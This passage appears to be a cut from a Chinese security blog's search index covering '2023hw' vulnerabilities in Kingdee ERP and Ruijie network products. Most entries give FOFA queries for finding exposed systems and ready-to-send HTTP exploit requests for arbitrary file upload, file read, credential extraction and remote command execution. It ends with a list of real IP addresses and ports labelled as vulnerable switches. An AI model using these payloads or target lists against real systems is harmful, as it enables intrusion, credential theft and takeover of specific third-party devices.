","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"金蝶OA 云星空 CommonFileServer 任意文件读取漏洞","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞 金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶 EAS 及 EAS Cloud 在 uploadLogo.action 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。 ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"Kingdee-EAS\" ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /plt_portal/setting/uploadLogo.action HTTP/1.1 Host: User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30) Accept-Encoding: gzip, deflate Accept: */* Connection: close X-Forwarded-For: Content-Length: 632 Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62 --04844569c7ca7d21a3ca115dca477d62 Content-Disposition: form-data; name=\"chooseLanguage_top\"; filename=\"chooseLanguage_top\" ch --04844569c7ca7d21a3ca115dca477d62 Content-Disposition: form-data; name=\"dataCenter\"; filename=\"dataCenter\" xx --04844569c7ca7d21a3ca115dca477d62 Content-Disposition: form-data; name=\"insId\"; filename=\"insId\" --04844569c7ca7d21a3ca115dca477d62 Content-Disposition: form-data; name=\"type\"; filename=\"type\" top --04844569c7ca7d21a3ca115dca477d62 Content-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\" Content-Type: image/png test --04844569c7ca7d21a3ca115dca477d62-- ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"上传文件路径 GET /portal/res/file/upload/xxx.jsp HTTP/1.1 Host: User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30) Accept-Encoding: gzip, deflate Accept: */* Connection: close X-Forwarded-For: ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞 ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞描述： 金蝶OA云星空 ScpSupRegHandler接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取服务器权限 ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:1","tags":["2023hw漏洞"],"title":"金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞影响： 金蝶云星空企业版私有云、企业版私有云（订阅）、标准版私有云（订阅）三个产品V6.2(含17年12月补丁) 至 V8.1(含23年9月补丁) ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:2","tags":["2023hw漏洞"],"title":"金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"网络测绘： app=\"金蝶云星空-管理中心\" ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:3","tags":["2023hw漏洞"],"title":"金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现： 登陆页面 POC: POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1 Host: Accept-Encoding: identity Content-Length: 973 Accept-Language: zh-CN,zh;q=0.8 Accept: */*Cache-Control: max-age=0 Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061 --2ac719f8e29343df94aa4ab49e456061 Content-Disposition: form-data; name=\"dbId_v\" . --2ac719f8e29343df94aa4ab49e456061 Content-Disposition: form-data; name=\"FID\" 2022 --2ac719f8e29343df94aa4ab49e456061 Content-Disposition: form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/test.ashx.\" Content-Type: text/plain 11 --2ac719f8e29343df94aa4ab49e456061- ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:4","tags":["2023hw漏洞"],"title":"金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"文件上传路径 访问路径：/K3Cloud/uploadfiles/Test.ashx ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:5","tags":["2023hw漏洞"],"title":"金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金蝶云星空 CommonFileserver 任意文件读取漏洞 GET /CommonFileServer/c:/windows/win.ini ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"金蝶云星空 CommonFileserver 任意文件读取漏洞","uri":"/%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 锐捷 BCR商业无线云网关 后台命令执行漏洞\r","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"锐捷 BCR商业无线云网关 后台命令执行漏洞","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 锐捷 BCR商业无线云网关 存在后台命令执行漏洞，攻击者通过默认口令可以登陆后台构造特殊的参数执行任意命令，获取服务器权限 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"锐捷 BCR商业无线云网关 后台命令执行漏洞","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 锐捷 BCR商业无线云网关 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"锐捷 BCR商业无线云网关 后台命令执行漏洞","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 fid=“N3IFMflkcmNQ2s4vuAhjzg==\" ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"锐捷 BCR商业无线云网关 后台命令执行漏洞","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 通过弱口令登陆后台 admin 拼接命令 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"锐捷 BCR商业无线云网关 后台命令执行漏洞","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞\r","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 锐捷 NBR 路由器 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 app=“Ruijie-NBR路由器” ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 出现漏洞的文件在 /ddi/server/fileupload.php， 该文件为标准的文件上传文件 文件名及目录均可控，导致可以任意上传文件 POST /ddi/server/fileupload.php?uploadDir=../../321\u0026name=123.php HTTP/1.1 Host: Accept: text/plain, */*; q=0.01 Content-Disposition: form-data; name=\"file\"; filename=\"111.php\" Content-Type: image/jpeg \u003c?php phpinfo();?\u003e 访问上传的文件目录 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞 POST /ddi/server/fileupload.php?uploadDir=../../321\u0026name=123.php HTTP/1.1 Host: Accept: text/plain, */*; q=0.01 Content-Disposition: form-data; name=\"file\"; filename=\"111.php\" Content-Type: image/jpeg \u003c?php phpinfo();?\u003e ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"锐捷-EG易网关存在RCE漏洞 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8rce%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"锐捷-EG易网关存在RCE漏洞","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"Ruijie-EG易网关\" ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8rce%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"锐捷-EG易网关存在RCE漏洞","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc 获取用户密码 POST /login.php HTTP/1.1 Host: 10.10.10.10 User-Agent: Go-http-client/1.1 Content-Length: 49 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip username=admin\u0026password=admin?show+webmaster+user 命令执行 POST /cli.php?a=shell HTTP/1.1 Host: 10.10.10.10 User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/x-www-form-urlencoded Cookie: 利用登录后Cookie的RUIJIEID字段进行替换，;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip notdelay=true\u0026command=ls ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8rce%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"锐捷-EG易网关存在RCE漏洞","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/:1:0","tags":["2023hw漏洞"],"title":"锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露","uri":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"影响版本 锐捷RG-UAC统一上网行为管理审计系统 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/:2:0","tags":["2023hw漏洞"],"title":"锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露","uri":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"fofa title=\"RG-UAC登录页面\" \u0026\u0026 body=\"admin\" ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/:3:0","tags":["2023hw漏洞"],"title":"锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露","uri":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 右键查看源代码 搜索 admin 即可找到admin md5密码 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/:4:0","tags":["2023hw漏洞"],"title":"锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露","uri":"/%E9%94%90%E6%8D%B7rg-uac%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"img/free_login_ge.gif\" \u0026\u0026 body=\"./img/login_bg.gif\" ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA-web-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-excu_shell-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞","uri":"/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA-web-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-excu_shell-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /EXCU_SHELL HTTP/1.1 Host: 110.164.188.24:8093 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cmdnum: 1 Command1: show running-config Confirm1: n Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA-web-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-excu_shell-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞","uri":"/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA-web-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-excu_shell-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞列表 http://116.30.122.109:10034 http://120.197.181.245:8083 http://120.40.102.137:10080 http://14.212.203.61:2126 http://183.89.124.128:8092 http://183.89.124.128:8093 http://183.89.124.128:8094 http://183.89.124.128:8091 http://183.89.124.128:8099 http://183.89.124.128:8095 http://183.89.124.128:8097 http://183.89.124.128:8100 http://183.89.124.128:8096 http://183.89.124.128:8105 http://221.10.100.109:8084 http://221.207.224.186:8070 http://221.207.224.186:8071 http://221.207.224.186:8095 http://221.207.224.186:8097 http://222.64.147.7:8067 http://59.45.111.251:10000 http://60.165.53.178:8812 http://60.165.53.178:8814 ","date":"2023-12-08","objectID":"/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA-web-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-excu_shell-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"锐捷交换机 WEB 管理系统 EXCU_SHELL 